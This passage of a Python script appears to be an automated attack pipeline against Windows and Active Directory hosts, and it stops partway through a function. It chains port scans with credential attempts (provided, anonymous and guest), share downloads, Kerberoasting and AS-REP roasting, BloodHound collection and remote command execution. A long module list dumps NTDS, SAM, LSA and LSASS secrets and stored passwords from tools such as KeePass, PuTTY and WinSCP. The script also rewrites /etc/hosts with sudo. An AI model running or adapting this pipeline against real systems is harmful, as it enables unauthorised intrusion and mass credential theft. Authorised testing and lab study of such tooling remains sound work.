#!/usr/bin/env python3

import subprocess
import threading
import argparse
import re
import sys
from pathlib import Path
import os
import shutil
from collections import deque
import random
import string
import json
import select
import time


def ask_user(question, default="yes", timeout=8, auto_mode=True):

    if not auto_mode:
        answer = input(question).strip().lower()
        return answer == "y"

    print(f"{question} (default: {default.upper()} in {timeout}s)")

    print("> ", end="", flush=True)

    start_time = time.time()

    while True:

        if select.select([sys.stdin], [], [], 0.1)[0]:
            answer = sys.stdin.readline().strip().lower()
            return answer == "y"

        if time.time() - start_time > timeout:
            print(f"\n[*] No input received. Using default: {default.upper()}")
            return default == "yes"


def run_interruptible_command(cmd, label):

    print(f"\n\033[1m\033[33m[{label}]\033[0m Running command...")
    print("\033[1m\033[37m[INFO]\033[0m Press Ctrl+C to stop this scan and continue.\n")

    process = subprocess.Popen(cmd)

    try:
        process.wait()

    except KeyboardInterrupt:
        print(f"\n\033[1m\033[31m[{label}]\033[0m Interrupted by user. Stopping this scan only...")
        process.terminate()
        process.wait()

    print(f"\n\033[1m\033[33m[{label}]\033[0m Returning to main pipeline.")


# -----------------------------
# RUSTSCAN
# -----------------------------
def run_rustscan(target_ip):
    output_file = "rustscan_all-ports_TCP.txt"

    print(f"[+] Running RustScan against {target_ip}")

    cmd = [
        "rustscan",
        "-a", target_ip,
        "-n",
        "--ulimit", "7000",
        "-t","4000",
        "-b","2000",
        "--scripts", "none"
    ]

    try:
        with open(output_file, "w") as f:
            subprocess.run(cmd, stdout=f, stderr=subprocess.STDOUT, check=True)

        print(f"[+] RustScan output saved to {output_file}")
        return output_file

    except subprocess.CalledProcessError:
        print("[!] RustScan failed")
        sys.exit(1)


# -----------------------------
# PORT EXTRACTION
# -----------------------------
def extract_ports(rustscan_output_file, target_ip):
    print("[+] Extracting open ports from RustScan output")

    with open(rustscan_output_file, "r", errors="ignore") as f:
        content = f.read()

    # Keresünk konkrét IP -> [portlist] mintát
    pattern = rf"{re.escape(target_ip)}\s*->\s*\[(.*?)\]"
    match = re.search(pattern, content)

    if not match:
        print("[!] No open ports found.")
        sys.exit(1)

    ports = match.group(1).replace(" ", "")
    print(f"[+] Open ports detected: {ports}")
    return ports


# -----------------------------
# NMAP BASIC
# -----------------------------
def run_nmap_basic(target_ip, ports):
    output_file = "nmap_all-ports_basic-info_TCP.txt"

    print("[+] Running Nmap basic service detection")

    cmd = [
        "nmap",
        target_ip,
        "-p", ports,
        "-Pn",
        "-sV",
        "--version-all",
        "--scan-delay", "4ms",
        "-vv",
        "-n",
        "-oN", output_file
    ]

    subprocess.run(cmd)
    print(f"[+] Basic Nmap scan saved to {output_file}")


# -----------------------------
# NMAP FULL (-A)
# -----------------------------
def run_nmap_full(target_ip, ports):
    output_file = "nmap_all-ports_all-info_TCP.txt"

    print("[+] Running Nmap full aggressive scan (-A)")

    cmd = [
        "sudo",
        "nmap",
        target_ip,
        "-p", ports,
        "-Pn",
        "-A",
        "--scan-delay", "4ms",
        "-vv",
        "--dns-servers", target_ip,
        "-oN", output_file
    ]

    subprocess.run(cmd)
    print(f"[+] Full Nmap scan saved to {output_file}")


def is_windows_likely(port_list):
    windows_ports = {
        "53", "88", "135", "389", "445", "636",
        "3268", "3269", "3389",
        "5357", "5358",
        "5985", "5986"
    }

    return any(port in windows_ports for port in port_list)

def build_output_filename(tool, username, command_name):
    safe_user = username if username else "anonymous"
    return f"{tool}_{safe_user}_{command_name}.txt"


def run_bober_exec(target_ip, username, password):
    base_cmd = [
        "bober-exec",
        "-f", "nmap_all-ports_basic-info_TCP.txt",
        "-ip", target_ip
    ]

    cmd_string = f"-u '{username}' -p '{password}' --threads 1 --timeout 3"
    full_cmd = base_cmd + ["-c", cmd_string]

    result = subprocess.run(full_cmd, capture_output=True, text=True)

    return result.stdout


def parse_bober_exec_output(output):
    results = {}

    lines = output.splitlines()

    for line in lines:
        line = line.strip()

        if not line:
            continue

        # Skip execution header
        if line.startswith("[EXEC]"):
            continue

        # Sor elején service név van
        parts = line.split()

        if len(parts) < 1:
            continue

        service = parts[0].lower()

        # Csak ismert service nevekkel dolgozunk
        if service not in ["smb", "ldap", "rpc", "winrm", "mssql", "rdp", "vnc", "ftp", "nfs"]:
            continue

        if service not in results:
            results[service] = {
                "has_plus": False,
                "has_minus": False
            }

        if "[+]" in line:
            results[service]["has_plus"] = True

        if "[-]" in line:
            results[service]["has_minus"] = True

    return results


def evaluate_services(parsed_results):
    valid_services = []

    for service, data in parsed_results.items():
        if data["has_plus"] and not data["has_minus"]:
            valid_services.append(service)

    return valid_services

def attempt(target_ip, user, pwd, label, create_smb_report):
    print(f"\n[*] Trying: {label}")

    output = run_bober_exec(target_ip, user, pwd)

    parsed = parse_bober_exec_output(output)
    candidate_services = evaluate_services(parsed)

    if not candidate_services:
        print("[-] No candidate services detected.")
        return {}

    print(f"[+] Candidate services: {', '.join(candidate_services)}")

    results = {}

    for service in candidate_services:

        # ===== LDAP BLOCK =====
        if service == "ldap":
            execute_ldap_block(target_ip, user, pwd)
            results[service] = "executed"
            continue
            
        service_results = execute_service(service, target_ip, user, pwd)
        results[service] = service_results

        # ===== SMB-REPORT BLOCK =====
        if service == "smb":
            if create_smb_report:
                execute_smb_report(target_ip, user, pwd)

    return results


def execute_windows_strategy(target_ip, username, password, skip_passwordless, create_smb_report):
    print("\n[+] Starting Windows credential strategy...")

    overall_results = {}

    credential_rounds = []

    if username is not None and password is not None:
        credential_rounds.append(("provided", username, password))

    if not skip_passwordless:
        credential_rounds.append(("anonymous", "", ""))
        credential_rounds.append(("guest", "guest", ""))
    else:
        print("[*] Skipping anonymous and guest rounds (--skip-passwordless-users)")

    for label, user, pwd in credential_rounds:
        results = attempt(target_ip, user, pwd, label, create_smb_report)
        overall_results[label] = results

    # ==============================
    # FINAL SUMMARY
    # ==============================

    print("\n========================================")
    print(" WINDOWS CREDENTIAL VALIDATION SUMMARY ")
    print("========================================")

    for label, results in overall_results.items():

        print(f"\n[{label.upper()}]")

        if not results:
            print("  No candidate services detected.")
            continue

        for service, status in results.items():
            print(f"  {service}: {status}")

    print("\n[+] Windows credential testing completed.\n")


def build_rpc_commands(target_ip, username, password):
    username = username or ""
    password = password or ""

    base = [
        "rpcclient",
        target_ip,
        f"--user={username}",
        f"--password={password}",
        "--client-protection=off"
    ]

    return [
        {
            "name": "enumdomusers",
            "cmd": base + ["--command=enumdomusers"],
            "parser": parse_rpc_enumdomusers
        },
        {
            "name": "netshareenumall",
            "cmd": base + ["--command=netshareenumall"],
            "parser": None  # raw save
        }
    ]


def detect_rpc_error(output):
    upper = output.upper()

    if "ACCESS_DENIED" in upper:
        return True, "ACCESS_DENIED"

    if "NT_STATUS_ACCESS_DENIED" in upper:
        return True, "NT_STATUS_ACCESS_DENIED"

    if "WERR_ACCESS_DENIED" in upper:
        return True, "WERR_ACCESS_DENIED"

    return False, None


def parse_rpc_enumdomusers(output):
    users = []

    for line in output.splitlines():
        match = re.search(r"user:\[(.*?)\]", line)
        if match:
            users.append(match.group(1))

    return users


def dump_smb_shares(target_ip, username, password, parsed_shares):

    for share in parsed_shares:
        dump_smb_share(target_ip, share, username, password)


def build_smb_commands(target_ip, username, password):
    username = username or ""
    password = password or ""

    return [
        {
            "name": "shares",
            "cmd": ["nxc", "smb", target_ip, "-u", username, "-p", password, "--shares"],
            "parser": parse_smb_shares,
            "post_process": dump_smb_shares  # új mező
        },
        {
            "name": "rid_brute",
            "cmd": ["nxc", "smb", target_ip, "-u", username, "-p", password, "--rid-brute"],
            "parser": parse_smb_rid_brute
        },
        {
            "name": "users_export",
            "cmd": [
                "nxc", "smb", target_ip,
                "-u", username,
                "-p", password,
                "--users-export", "users.txt"
            ],
            "parser": None,
            "success_condition": "file",
            "produced_file": "users.txt"
        },
        {
            "name": "pass_pol",
            "cmd": [
                "nxc", "smb", target_ip,
                "-u", username,
                "-p", password,
                "--pass-pol"
            ],
            "success_condition": "contains",
            "success_marker": "Dumping password info for domain"
        }
    ]


def detect_smb_error(output):
    if "[-]" in output:
        return True, "Error detected in output"

    return False, None


def parse_smb_rid_brute(output):
    users = []

    for line in output.splitlines():

        # Csak user típusú SID-ek
        if "SidTypeUser" not in line:
            continue

        # Minta: 500: OVERWATCH\Administrator (SidTypeUser)
        match = re.search(r"\\([^\\\s]+)\s+\(SidTypeUser\)", line)
        if match:
            users.append(match.group(1))

    return users


def parse_smb_shares(output):
    shares = []
    ignore_shares = {"ADMIN$", "C$", "IPC$"}

    lines = output.splitlines()
    start_parsing = False

    for line in lines:

        # Keressük a header sort
        if "Share" in line and "Permissions" in line:
            start_parsing = True
            continue

        if not start_parsing:
            continue

        if "-----" in line:
            continue

        # Ha már nem SMB sor, skip
        if not line.strip().startswith("SMB"):
            continue

        parts = line.split()

        # Minimum 6 oszlop kell
        if len(parts) < 6:
            continue

        # A share név stabilan az 5. indexen van
        # (SMB IP PORT HOST SHARE ...)
        share_name = parts[4]

        permissions = None
        if len(parts) >= 6:
            permissions = parts[5]

        if share_name in ignore_shares:
            continue

        if permissions and "READ" in permissions.upper():
            shares.append(share_name)

    return shares


def dump_smb_share(target_ip, share, username, password):

    safe_user = username if username else "anonymous"
    directory = f"smb_{safe_user}_{share}_content"

    os.makedirs(directory, exist_ok=True)

    cmd = [
        "smbclient",
        f"//{target_ip}/{share}",
        f"--user={username}",
        f"--password={password}",
        "--client-protection=off",
        "-c",
        "recurse on;prompt off;mget *"
    ]

    print(f"\033[1m\033[36m[CMD]\033[0m {' '.join(cmd)}")
    print(f"[+] Dumping share '{share}' into {directory}")

    result = subprocess.run(
        cmd,
        cwd=directory,
        capture_output=True,
        text=True
    )

    if "NT_STATUS_ACCESS_DENIED" in result.stdout.upper():
        print(f"[-] Access denied on share {share}")
        return False

    print(f"[+] Share {share} dumped successfully")
    return True


def execute_service(service, target_ip, username, password):
    if service not in SERVICE_EXECUTORS:
        print(f"[!] No executor defined for {service}")
        return {}

    print(f"\n[+] Executing {service} modules...")

    executor = SERVICE_EXECUTORS[service]
    commands = executor["command_builder"](target_ip, username, password)
    error_detector = executor["error_detector"]

    service_results = {}

    for entry in commands:
        name = entry["name"]
        cmd = entry["cmd"]
        parser = entry.get("parser")
        post_process = entry.get("post_process")
        success_condition = entry.get("success_condition", "stdout")
        produced_file = entry.get("produced_file")
        success_marker = entry.get("success_marker")

        print(f"\033[1m\033[36m[CMD]\033[0m {' '.join(cmd)}")

        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout
        # --- FILE BASED SUCCESS ---
        if success_condition == "file":

            if produced_file and os.path.exists(produced_file):
                final_filename = build_output_filename(service, username, name)

                os.rename(produced_file, final_filename)
                print(f"[+] {service}:{name} succeeded (file created)")
                print(f"[+] Output saved to {final_filename}")

                service_results[name] = "success"

            else:
                print(f"[-] {service}:{name} failed (no file created)")
                service_results[name] = "error"

            continue
        
        if success_condition == "contains":

            if success_marker and success_marker in output:
                filename = build_output_filename(service, username, name)

                with open(filename, "w") as f:
                    f.write(output)

                print(f"[+] {service}:{name} succeeded (policy dumped)")
                print(f"[+] Output saved to {filename}")

                service_results[name] = "success"

            else:
                print(f"[-] {service}:{name} returned no usable data")

                service_results[name] = "no_result"

            continue

        has_error, reason = error_detector(output)

        filename = build_output_filename(service, username, name)

        if has_error:
            print(f"[-] {service}:{name} failed ({reason})")
            service_results[name] = "error"
            continue

        print(f"[+] {service}:{name} executed successfully")

        if parser:
            parsed_data = parser(output)

            with open(filename, "w") as f:
                for item in parsed_data:
                    f.write(item + "\n")

            print(f"[+] Parsed output saved to {filename}")

            if post_process:
                post_process(target_ip, username, password, parsed_data)

        else:
            with open(filename, "w") as f:
                f.write(output)

            print(f"[+] Raw output saved to {filename}")

        service_results[name] = "success"

    return service_results


SERVICE_EXECUTORS = {
    "rpc": {
        "command_builder": build_rpc_commands,
        "error_detector": detect_rpc_error
    },
    "smb": {
        "command_builder": build_smb_commands,
        "error_detector": detect_smb_error
    }
}

LDAP_COMMANDS = [
    {"name": "Get SID", "args": ["--get-sid"]},
    {"name": "Domain Controllers", "args": ["--dc-list"]},
    {"name": "Computers", "args": ["--computers"]},
    {"name": "Domain Admins Group", "args": ["--groups", "Domain Admins"]},
    {"name": "Admin Count", "args": ["--admin-count"]},
    {"name": "User Descriptions", "args": ["-M", "get-desc-users"]},

    {"name": "Trusted for Delegation", "args": ["--trusted-for-delegation"]},
    {"name": "Find Delegation", "args": ["--find-delegation"]},
    {"name": "ADCS Servers", "args": ["-M", "adcs"]},

    {"name": "Entra ID", "args": ["-M", "entra-id"]},
    {"name": "Password Settings Objects", "args": ["--pso"]},
    {"name": "gMSA Dump", "args": ["--gmsa"]},
    {"name": "Machine Account Quota", "args": ["-M", "maq"]},

    {"name": "ASREPRoast", "args": ["--asreproast", "asreproast.txt"]},
    {"name": "Kerberoasting", "args": ["--kerberoasting", "kerberoasting.txt"]},

    {"name": "Bloodhound Collection", "args": ["--bloodhound", "--collection", "All"], "bloodhound": True}
]

def execute_ldap_block(target_ip, username, password):

    safe_user = username if username else "anonymous"
    output_filename = f"ldap_{safe_user}_output.txt"

    print("\n[+] Starting LDAP enumeration block...\n")

    with open(output_filename, "w") as report:

        for entry in LDAP_COMMANDS:

            name = entry["name"]
            args = entry["args"]
            is_bloodhound = entry.get("bloodhound", False)

            print(f"[LDAP] Running: {name}")

            cmd = [
                "nxc", "ldap", target_ip,
                "-u", username,
                "-p", password
            ] + args

            # DNS server hozzáadás ha kell
            if "--asreproast" in args or "--kerberoasting" in args or is_bloodhound:
                cmd += ["--dns-server", target_ip]

            result = subprocess.run(cmd, capture_output=True, text=True)
            output = result.stdout

            # ===== REPORT FORMATTING =====

            report.write("\n")
            report.write("=" * 80 + "\n")
            report.write(f"[ {name} ]\n")
            report.write("=" * 80 + "\n\n")

            report.write(output)
            report.write("\n")

            # ===== BLOODHOUND ZIP HANDLING =====

            if is_bloodhound and "Compressing output into" in output:

                match = re.search(r"Compressing output into (.+\.zip)", output)
                if match:
                    zip_path = match.group(1).strip()

                    if os.path.exists(zip_path):
                        destination = os.path.basename(zip_path)
                        shutil.move(zip_path, destination)

                        print(f"[+] Bloodhound zip moved to current directory: {destination}")
                    else:
                        print("[!] Bloodhound zip path found but file missing.")

    print(f"\n[+] LDAP report saved to {output_filename}\n")

SMB_REPORT_COMMANDS = [
    # ENUMERATION
    {"name": "Active Sessions", "args": ["--qwinsta"]},
    {"name": "Logged On Users", "args": ["--loggedon-users"]},
    {"name": "AV & EDR", "args": ["-M", "enum_av"]},
    {"name": "Password Policy", "args": ["--pass-pol"]},
    {"name": "Local Groups", "args": ["--local-group"]},
    {"name": "Lockscreen Doors", "args": ["-M", "lockscreendoors"]},
    {"name": "Network Interfaces", "args": ["--interfaces"]},
    {"name": "Tasklist", "args": ["--tasklist"]},
    {"name": "Shares", "args": ["--shares"]},
    {"name": "Relay List", "args": ["--gen-relay-list", "relay_list.txt"]},

    # COMMAND EXECUTION
    {"name": "Command Execution (cmd)", "args": ["-x", "whoami"]},
    {"name": "Command Execution (PowerShell)", "args": ["-X", "$PSVersionTable"]},

    # DELEGATION
    {"name": "Delegation (RBCD)", "args": ["--delegate", "Administrator"]},

    # OBTAINING CREDENTIALS
    {"name": "Backup Operator", "args": ["-M", "backup_operator"]},
    {"name": "DPAPI", "args": ["--dpapi"]},
    {"name": "DPAPI Cookies", "args": ["--dpapi", "cookies"]},
    {"name": "DPAPI NoSystem", "args": ["--dpapi", "nosystem"]},
    {"name": "DPAPI LocalAuth", "args": ["--local-auth", "--dpapi", "nosystem"]},
    {"name": "Eventlog Creds", "args": ["-M", "eventlog_creds"]},
    {"name": "KeePass", "args": ["-M", "keepass_discover"]},
    {"name": "mRemoteNG", "args": ["-M", "mremoteng"]},
    {"name": "Notepad", "args": ["-M", "notepad"]},
    {"name": "Notepad++", "args": ["-M", "notepad++"]},
    {"name": "PuTTY", "args": ["-M", "putty"]},
    {"name": "RDCMan", "args": ["-M", "rdcman"]},
    {"name": "NTDS", "args": ["--ntds"]},
    {"name": "NTDS Enabled", "args": ["--ntds", "--enabled"]},
    {"name": "NTDS VSS", "args": ["--ntds", "vss"]},
    {"name": "NTDSUtil", "args": ["-M", "ntdsutil"]},
    {"name": "LSA", "args": ["--lsa"]},
    {"name": "LSA Secdump", "args": ["--lsa", "secdump"]},
    {"name": "Lsassy", "args": ["-M", "lsassy"]},
    {"name": "Nanodump", "args": ["-M", "nanodump"]},
    {"name": "SAM", "args": ["--sam"]},
    {"name": "SAM Secdump", "args": ["--sam", "secdump"]},
    {"name": "SCCM", "args": ["--sccm"]},
    {"name": "SCCM Disk", "args": ["--sccm", "disk"]},
    {"name": "SCCM WMI", "args": ["--sccm", "wmi"]},
    {"name": "WAM", "args": ["-M", "wam"]},
    {"name": "Veeam", "args": ["-M", "veeam"]},
    {"name": "VNC", "args": ["-M", "vnc"]},
    {"name": "WiFi", "args": ["-M", "wifi"]},
    {"name": "WinSCP", "args": ["-M", "winscp"]},
]

def execute_smb_report(target_ip, username, password):

    safe_user = username if username else "anonymous"
    output_filename = f"smb_{safe_user}_report.txt"

    print("\n[+] Starting extended SMB report (requires high privileges)...\n")

    with open(output_filename, "w") as report:

        for entry in SMB_REPORT_COMMANDS:

            name = entry["name"]
            args = entry["args"]

            print(f"[SMB-REPORT] Running: {name}")

            cmd = [
                "nxc", "smb", target_ip,
                "-u", username,
                "-p", password
            ] + args

            result = subprocess.run(cmd, capture_output=True, text=True)
            output = result.stdout

            report.write("\n")
            report.write("=" * 80 + "\n")
            report.write(f"[ {name} ]\n")
            report.write("=" * 80 + "\n\n")
            report.write(output)
            report.write("\n")

    print(f"\n[+] SMB extended report saved to {output_filename}\n")


def is_valid_domain(domain):
    domain = domain.strip().lower()

    if domain.endswith("."):
        domain = domain[:-1]

    # Reject raw IPv4
    if re.match(r"^\d+\.\d+\.\d+\.\d+$", domain):
        return False

    # Reject localhost variants
    if domain.startswith("localhost"):
        return False

    # Reject known unwanted suffixes
    IGNORED_SUFFIXES = (
        "nmap.org",
        "example.com",
        "localhost",
    )

    if any(domain.endswith(suffix) for suffix in IGNORED_SUFFIXES):
        return False

    # Must contain at least one dot
    if "." not in domain:
        return False

    # TLD must be letters only
    tld = domain.split(".")[-1]
    if not tld.isalpha():
        return False

    return True


def run_ldap_scan(target_ip):
    print("\n[+] Running LDAP scan...\n")

    output_file = "nmap_LDAP.txt"

    cmd = [
        "nmap",
        target_ip,
        "-p", "389",
        "-Pn",
        "-sV",
        "--version-all",
        "--script", "*ldap* and (default or discovery or safe or version or vuln)",
        "-vv",
        "-oN", output_file
    ]

    subprocess.run(cmd)
    return output_file


def discover_ad_via_ldap(target_ip):
    print("\n[+] Discovering AD information via LDAP...")

    ad_core = {
        "dns_domain": None,
        "dc_hosts": set()
    }

    try:
        ldap_file = run_ldap_scan(target_ip)

        with open(ldap_file, "r", errors="ignore") as f:
            content = f.read()

        # Extract domain
        naming_context = re.search(r"defaultNamingContext:\s*(DC=.*)", content)
        if naming_context:
            parts = re.findall(r"DC=([^,]+)", naming_context.group(1))
            if parts:
                candidate = ".".join(parts).lower()
                if is_valid_domain(candidate):
                    ad_core["dns_domain"] = candidate


        # Extract DC hostnames
        dc_hosts = re.findall(r"dnsHostName:\s*([^\n]+)", content)
        for host in dc_hosts:
            host = host.strip().lower().rstrip(".")
            if is_valid_domain(host):
                ad_core["dc_hosts"].add(host)


        print("[+] AD Discovery Results:")
        print(f"    DNS Domain: {ad_core['dns_domain']}")
        print(f"    DC Hosts: {', '.join(ad_core['dc_hosts']) if ad_core['dc_hosts'] else 'None'}")

    except Exception:
        print("[-] LDAP AD discovery failed.")
        ad_core["dns_domain"] = None
        ad_core["dc_hosts"] = set()

    return ad_core


def strip_traceroute_blocks(content):

    pattern = r"TRACEROUTE.*?(?=\n\n|\Z)"
    return re.sub(pattern, "", content, flags=re.DOTALL)


def discover_web_domains(nmap_full_output, target_ip):
    print("\n[+] Discovering web domains and port mappings...\n")

    web_map = {}

    with open(nmap_full_output, "r", errors="ignore") as f:
        content = f.read()
    
    content = strip_traceroute_blocks(content)

    port_blocks = re.split(r"\n(\d+/tcp\s+open[^\n]*)", content)

    for i in range(1, len(port_blocks), 2):
        port_line = port_blocks[i]
        block = port_blocks[i + 1]

        port_match = re.search(r"(\d+)/tcp", port_line)
        if not port_match:
            continue

        port = int(port_match.group(1))
        port_line_lower = port_line.lower()

        # -------------------------
        # Strict HTTP detection
        # -------------------------
        if not re.search(r"\bhttps?\b", port_line_lower):
            continue

        if any(x in port_line_lower for x in [
            "microsoft httpapi",
            "rpc over http",
            "ncacn_http",
            "wsman",
            "winrm"
        ]):
            continue

        candidates = []

        # 1 Redirect
        for match in re.findall(
            r"Did not follow redirect to (https?)://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
            block
        ):
            scheme, domain = match
            candidates.append((domain, scheme))

        # 2 Title / URL references
        for match in re.findall(
            r"(https?)://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
            block
        ):
            scheme, domain = match
            candidates.append((domain, scheme))

        # 3 Location header
        for match in re.findall(
            r"Location:\s*(https?)://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
            block
        ):
            scheme, domain = match
            candidates.append((domain, scheme))

        # 4 SSL CN
        for cn in re.findall(
            r"Subject:\s*commonName=([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
            block
        ):
            if "fallback" in cn.lower():
                continue
            candidates.append((cn, "https"))

        # 5 SSL SAN
        for san in re.findall(
            r"DNS:([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
            block
        ):
            candidates.append((san, "https"))

        candidates = [
            (domain.lower().rstrip("."), scheme)
            for domain, scheme in candidates
            if is_valid_domain(domain.lower().rstrip("."))
        ]

        if not candidates:
            # We confirmed it's HTTP and not Windows internal HTTP service
            fallback_domain = target_ip

            if fallback_domain not in web_map:
                web_map[fallback_domain] = {
                    "ports": set(),
                    "schemes": set()
                }

            # Determine scheme more reliably

            scheme = "http"  # default conservative fallback

            # Explicit https indicators in service field
            if re.search(r"\bhttps\b", port_line_lower):
                scheme = "https"

            # Common nmap https patterns
            elif re.search(r"\bssl/http\b", port_line_lower):
                scheme = "https"

            elif re.search(r"\bssl\b", port_line_lower):
                scheme = "https"

            # Check full block for TLS certificate evidence
            elif re.search(r"Subject:\s*commonName=", block):
                scheme = "https"

            elif re.search(r"SSL certificate", block, re.IGNORECASE):
                scheme = "https"

            web_map[fallback_domain]["ports"].add(port)
            web_map[fallback_domain]["schemes"].add(scheme)

        # -------------------------
        # Store
        # -------------------------
        for domain, scheme in candidates:
            domain = domain.lower().rstrip(".")
            
            if domain not in web_map:
                web_map[domain] = {
                    "ports": set(),
                    "schemes": set()
                }

            web_map[domain]["ports"].add(port)
            web_map[domain]["schemes"].add(scheme)

    if web_map:
        for domain, data in web_map.items():
            print(f"[+] {domain} -> Ports: {sorted(data['ports'])} Schemes: {sorted(data['schemes'])}")
    else:
        print("[-] No web domains discovered")

    return web_map


def extract_structured_domains(content):
    domains = set()

    # --- NTLM / RDP / MSSQL blocks ---
    ntlm_patterns = [
        r"DNS_Domain_Name:\s*(.+)",
        r"DNS_Computer_Name:\s*(.+)",
        r"DNS_Tree_Name:\s*(.+)"
    ]

    for pattern in ntlm_patterns:
        for match in re.findall(pattern, content):
            domain = match.strip().lower().rstrip(".")
            if is_valid_domain(domain):
                domains.add(domain)

    # --- LDAP naming context ---
    for dc_string in re.findall(r"defaultNamingContext:\s*(DC=.*)", content):
        parts = re.findall(r"DC=([^,]+)", dc_string)
        if parts:
            domain = ".".join(parts).lower()
            domains.add(domain)

    # --- SSL CN ---
    for cn in re.findall(r"Subject: commonName=([^\n]+)", content):
        cn = cn.strip().lower().rstrip(".")
        if is_valid_domain(cn):
            domains.add(cn)

    # --- SSL SAN ---
    for san in re.findall(r"DNS:([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", content):
        domains.add(san.lower())

    # --- HTTP Redirect ---
    for redirect in re.findall(r"http[s]?://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", content):
        domains.add(redirect.lower())

    # --- SMB domain tag ---
    for smb_domain in re.findall(r"\(domain:([^)]+)\)", content):
        smb_domain = smb_domain.lower().rstrip(".")
        if is_valid_domain(smb_domain):
            domains.add(smb_domain)

    return domains


def build_global_domain_list(ad_core, web_map, nmap_full_output):
    domains = set()

    # AD core
    if ad_core:
        dns_domain = ad_core.get("dns_domain")
        if dns_domain:
            domains.add(dns_domain.lower().rstrip("."))

        for host in ad_core.get("dc_hosts") or set():
            domains.add(host.lower().rstrip("."))

    # Web
    domains.update(web_map.keys())

    # Structured extraction
    with open(nmap_full_output, "r", errors="ignore") as f:
        content = f.read()

    content = strip_traceroute_blocks(content)

    structured = extract_structured_domains(content)

    domains.update(structured)

    domains = {
        d for d in domains
        if is_valid_domain(d)
    }

    print("\n=== GLOBAL DOMAIN LIST ===")
    for domain in sorted(domains):
        print(f"[+] {domain}")

    return domains


def update_hosts_file(target_ip, domains):

    hosts_path = "/etc/hosts"
    print("\n[+] Updating hosts entries...\n")

    domains = {d.lower() for d in domains}

    try:
        with open(hosts_path, "r") as f:
            lines = f.readlines()
    except Exception as e:
        print(f"[!] Could not read hosts file: {e}")
        return

    updated_lines = []
    domains_to_add = set(domains)

    for line in lines:
        stripped = line.strip()

        if stripped.startswith("#") or not stripped:
            updated_lines.append(line)
            continue

        parts = stripped.split()
        ip = parts[0]
        existing_domains = parts[1:]

        replaced = False

        for domain in existing_domains:
            if domain.lower() in domains:
                updated_lines.append(f"{target_ip} {domain.lower()}\n")
                domains_to_add.discard(domain.lower())
                replaced = True
                break

        if not replaced:
            updated_lines.append(line)

    for domain in domains_to_add:
        updated_lines.append(f"{target_ip} {domain}\n")

    new_content = "".join(updated_lines)

    subprocess.run(
        ["sudo", "tee", hosts_path],
        input=new_content,
        text=True,
        stdout=subprocess.DEVNULL
    )

    print("[+] Hosts file updated successfully.")


# -----------------------------
# WEB SCANNING
# -----------------------------

def validate_web_target(scheme, target_ip, host, port):

    if scheme =="http":
        url = f"{scheme}://{target_ip}:{port}"
        header = f"Host: {host}"

        cmd = [
            "curl",
            "-s",
            "-o", "/dev/null",
            "-D", "-",
            "--max-time", "5",
            "--connect-timeout", "3",
            "-k",
            "-H", header,
            url
        ]
    else: # https
        url = f"{scheme}://{host}:{port}"
        resolve = f"{host}:{port}:{target_ip}"
        cmd = [
            "curl",
            "-s",
            "-o", "/dev/null",
            "-D", "-",
            "--max-time", "5",
            "--connect-timeout", "3",
            "-k",
            "--resolve", resolve,
            url
        ]

    result = subprocess.run(cmd, capture_output=True, text=True)
    headers = result.stdout

    if result.returncode in (0, 22) and "HTTP/" in headers:
        return True

    return False


def build_validated_web_targets(web_map, target_ip):
    print("\n[+] Validating discovered web services...\n")

    validated_targets = []

    for host, data in web_map.items():
        is_domain = not re.match(r"^\d+\.\d+\.\d+\.\d+$", host)

        for port in data["ports"]:
            for scheme in data["schemes"]:

                print(f"\033[1m\033[37m[CHECK]\033[0m {scheme}://{host}:{port}")

                if validate_web_target(scheme, target_ip, host, port):
                    print("  [+] Valid web service confirmed")

                    validated_targets.append({
                        "host": host,
                        "port": port,
                        "scheme": scheme,
                        "is_domain": is_domain,
                        "supports_vhost_enum": is_domain
                    })

                else:
                    print("  [-] Not a valid web service")

    return validated_targets


def run_web_crawler(target, target_ip, auto_mode):

    host = target["host"]
    scheme = target["scheme"]
    port = target["port"]

    """
    if not is_valid_domain(host):
        print("\033[1m\033[37m[CRAWLER]\033[0m Skipping: target is not a domain.")
        return
    """

    base_url = f"{scheme}://{host}:{port}"

    print(f"\n\033[1m\033[37m[CRAWLER]\033[0m Target: {base_url}")

    # -----------------------------------
    # Ask if user wants to run crawler
    # -----------------------------------
    if not ask_user(
        "Run web crawler for this target? [y/N]: ",
        default="yes",
        auto_mode = auto_mode
    ):
        print("\033[1m\033[37m[CRAWLER]\033[0m Skipped by user.")
        return

    # -----------------------------------
    # Ask about proxy usage
    # -----------------------------------
    print("\n\033[1m\033[37m[CRAWLER]\033[0m The crawler supports running through a Burp proxy (127.0.0.1:8080).")
    print("          Make sure Burp is running and listening before proceeding.")
    
    use_proxy = False
    
    if ask_user(
        "Run crawler through Burp proxy (127.0.0.1:8080)? [y/N]: ",
        default="yes",
        auto_mode = auto_mode
    ):
        use_proxy = True

    # -----------------------------------
    # Build command
    # -----------------------------------
    cmd = [
        "bober-crawler",
        "--start-url", f"{base_url}/",
        "--scope", base_url
    ]

    if not use_proxy:
        cmd.append("--no-proxy")

    print("\033[1m\033[36m[CMD]\033[0m", " ".join(cmd))

    run_interruptible_command(cmd, "CRAWLER")


def generate_random_path(length=12):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def get_endpoint_baseline(target, target_ip):

    scheme = target["scheme"]
    domain = target["host"]
    port = target["port"]

    results = []

    print("[*] Calculating endpoint baseline...")

    for _ in range(3):

        random_path = generate_random_path()

        if scheme == "http":
            url = f"http://{target_ip}:{port}/{random_path}"

            cmd = [
                "curl",
                "-s",
                "-k",
                "-o", "/dev/null",
                "-w", "%{http_code} %{size_download}",
                "-H", f"Host: {domain}",
                url
            ]

        else:
            url = f"https://{domain}:{port}/{random_path}"
            resolve = f"{domain}:{port}:{target_ip}"

            cmd = [
                "curl",
                "-s",
                "-k",
                "-o", "/dev/null",
                "-w", "%{http_code} %{size_download}",
                "--resolve", resolve,
                url
            ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout.strip()

        if not output:
            continue

        try:
            status, size = output.split()
            results.append((status, size))
        except:
            continue

    if len(results) < 3:
        print("[-] Endpoint baseline unstable.")
        return None

    if len(set(results)) == 1:
